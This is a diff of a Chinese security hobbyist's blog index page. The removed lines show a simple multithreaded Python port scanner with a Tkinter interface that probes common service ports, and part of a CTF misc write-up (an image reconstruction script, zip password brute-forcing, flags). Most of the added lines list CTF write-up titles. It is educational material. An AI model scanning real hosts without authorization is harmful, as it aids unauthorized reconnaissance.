class="params">self</span>):</span><br><span class="line">        <span class="comment">#判断输入的IP是否正确</span></span><br><span class="line">        reg = <span class="string">&#x27;^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$&#x27;</span></span><br><span class="line">        ip = re.<span class="keyword">match</span>(reg, self.IP.get())</span><br><span class="line">        <span class="keyword">if</span> ip <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            action(ip.group())</span><br><span class="line">            Port_open_content = Label(self.init_window_name, text=Port_is_open)</span><br><span class="line">            Port_open_content.grid(row=<span class="number">4</span>,column=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;IP格式错误&quot;</span>)</span><br><span class="line">            tkinter.messagebox.showerror(<span class="string">&#x27;错误&#x27;</span>, <span class="string">&#x27;IP格式错误&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">mythread</span>(<span class="title class_ inherited__">Thread</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, fun, args</span>):</span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.fun = fun</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        self.fun(*self.args)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">h, p</span>):</span><br><span class="line">        <span class="keyword">global</span> Port_is_open</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tcpCliSock = socket(AF_INET, SOCK_STREAM) <span class="comment">#初始化socket，AF_INET表示IPv4 socket, SOCK_STREAM表示tcp socket，初始化了一个使用IPv4, TCP协议的socket</span></span><br><span class="line">            tcpCliSock.connect((host, p))</span><br><span class="line">            <span class="keyword">if</span> lock.acquire():</span><br><span class="line">                Port_is_open += <span class="string">&quot;&quot;</span> + <span class="built_in">str</span>(p) + <span class="string">&quot; -&gt; opened\n&quot;</span></span><br><span class="line">                lock.release()</span><br><span class="line">        <span class="keyword">except</span> error:</span><br><span class="line">            <span class="keyword">if</span> lock.acquire():</span><br><span class="line">                Port_is_open += <span class="string">&quot;&quot;</span> + <span class="built_in">str</span>(p) + <span class="string">&quot; -&gt; not open\n&quot;</span></span><br><span class="line">                lock.release()</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            tcpCliSock.close()</span><br><span class="line">            <span class="keyword">del</span> tcpCliSock</span><br><span class="line"></span><br><span class="line">    lock = Lock()</span><br><span class="line">    ports = [<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">69</span>, <span class="number">80</span>, <span class="number">135</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">1521</span>, <span class="number">1433</span>, <span class="number">3306</span>, <span class="number">3389</span>, <span class="number">6371</span>, <span class="number">7001</span>]</span><br><span class="line">    host = ip</span><br><span class="line">    mt = []</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> ports:</span><br><span class="line">        t = mythread(scan,(host,p))</span><br><span class="line">        mt.append(t)</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> mt:</span><br><span class="line">        m.start()</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> mt:</span><br><span class="line">        m.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(Port_is_open)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    init_window = Tk()</span><br><span class="line">    scan = Port_Scan(init_window)</span><br><span class="line">    scan.set_init_window()</span><br><span class="line">    init_window.mainloop()</span><br></pre></td></tr></table></figure>
-
-<p>执行结果：<br><img src="http://ayanagi.fun/post-images/1680353302250.png"></p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E7%AE%80%E5%8D%95%E5%86%99%E4%B8%AA%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
             <a href="/2021/05/06/cstc2021/">2021第六届全国网络空间安全大赛 misc wp</a>
         </h1>
         
         <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
     
     <i class="icon-calendar vm"></i>
     
@@ -1375,17 +163,598 @@
     
     <section class="article-body markdown-body">
         
-        <p>流量分析是一血，感觉还不错，有些题目有些比较抖机灵的部分吧。</p>
-<h2 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h2><p>附件<code>code.txt</code>，打开是图片的RGB值，稍微修改一下数据令其为<code>R,G,B</code>形式的格式，看了一下有28864行，分解一下，第一次试的是164*176，出来一个乱图，那么换一下xy，脚本如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">176</span>    </span><br><span class="line">y = <span class="number">164</span>    </span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (x, y))   </span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;code.txt&#x27;</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline()  </span><br><span class="line">        rgb = line.split(<span class="string">&quot;,&quot;</span>)  </span><br><span class="line">        im.putpixel((i, j), (<span class="built_in">int</span>(rgb[<span class="number">0</span>]), <span class="built_in">int</span>(rgb[<span class="number">1</span>]), <span class="built_in">int</span>(rgb[<span class="number">2</span>])))  </span><br><span class="line"></span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>
-
-<p>得到的flag保存为图片，扔进imagemagick里flop一下</p>
-<p><code>flag&#123;c1d836d1db9d42dd&#125;</code></p>
-<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>爆破，一开始没做出来，先后采用了1-8位纯数字和1-8位大写字母和数字组合，没有尝试小写字母数字组合，后来再试得到密码<code>ff123</code>，解压得到txt文件和加密的文档，txt文件内容得知考点应该是0宽和培根，培根解得文档密码<code>xyj</code>，打开文档复制全部内容解密，发现并不是0宽，在文档里全选修改字体颜色为红色发现flag。<code>flag&#123;cbfacb9df0c7caf9a2b8a8ffbd72d1a0&#125;</code></p>
-<h2 id="Memory-1"><a href="#Memory-1" class="headerlink" title="Memory_1"></a>Memory_1</h2><p>附件<code>val.vmem</code>，在<code>volatility</code>里查看信息</p>
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2021/05/06/cstc2021/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2021/03/17/VNCTF2021/">V&amp;N CTF2021 misc 简要复现</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2021-03-17T06:19:41.000Z" itemprop="datePublished">2021-03-17</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2021/03/17/VNCTF2021/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2021/03/14/ACTF2021/">ACTF2021Misc 复现&amp;wp</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2021-03-14T07:09:49.000Z" itemprop="datePublished">2021-03-14</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2021/03/14/ACTF2021/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2021/03/12/Reverse/">0基础的Re基操</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2021-03-12T14:00:30.000Z" itemprop="datePublished">2021-03-12</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2021/03/12/Reverse/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2021/03/12/0%E5%9F%BA%E7%A1%80%E7%9A%84Re%E5%9F%BA%E6%93%8D/">0基础的Re基操</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2021-03-12T03:42:48.000Z" itemprop="datePublished">2021-03-12</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2021/03/12/0%E5%9F%BA%E7%A1%80%E7%9A%84Re%E5%9F%BA%E6%93%8D/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2021/03/01/Hgame2021/">Hgame2021 misc WP+复现</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2021-03-01T10:29:07.000Z" itemprop="datePublished">2021-03-01</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2021/03/01/Hgame2021/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2021/02/24/ROASTMEAT/">特效轴入门</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2021-02-24T12:26:47.000Z" itemprop="datePublished">2021-02-24</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/%E6%8A%80%E6%9C%AF%E5%8A%9B/" rel="tag">技术力</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2021/02/24/ROASTMEAT/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2021/02/23/BMZCTF/">BMZCTF misc 随手部分wp</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2021-02-23T04:34:55.000Z" itemprop="datePublished">2021-02-23</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2021/02/23/BMZCTF/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2021/01/25/CTFshowDJB/">CTFWshow DJBCTF大吉杯 部分misc 复现</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2021-01-25T06:47:29.000Z" itemprop="datePublished">2021-01-25</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2021/01/25/CTFshowDJB/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2021/01/24/starctf/">*CTF misc 部分复现</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2021-01-24T05:25:17.000Z" itemprop="datePublished">2021-01-24</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2021/01/24/starctf/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2021/01/22/0raysCB2020/">杭电0rays 2020招新赛Misc 复现</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2021-01-22T14:44:12.000Z" itemprop="datePublished">2021-01-22</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2021/01/22/0raysCB2020/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2020/12/30/ZONGHENGCUP2020/">2020纵横杯 Misc wp+复现</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2020-12-30T02:40:16.000Z" itemprop="datePublished">2020-12-30</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2020/12/30/ZONGHENGCUP2020/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2020/12/25/DASxBJD1225/">DASCTF x BJD 12月圣诞狂欢赛Misc wp</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2020-12-25T10:18:43.000Z" itemprop="datePublished">2020-12-25</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2020/12/25/DASxBJD1225/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2020/12/08/SWPU2020/">SWPUCTF 2020-Misc WP</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2020-12-08T03:02:23.000Z" itemprop="datePublished">2020-12-08</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2020/12/08/SWPU2020/#more">
+                <span class="vm">阅读更多</span>
+                <i class="icon-arrow-double-right vm"></i>    
+            </a>
+        </p>
+        
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            <a href="/2020/12/08/Roar2020/">RoarCTF 2020-Misc wp</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2020-12-08T02:47:08.000Z" itemprop="datePublished">2020-12-08</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+        
+        <p class="article-more-link">
+            <a href="/2020/12/08/Roar2020/#more">
                 <span class="vm">阅读更多</span>
                 <i class="icon-arrow-double-right vm"></i>    
             </a>
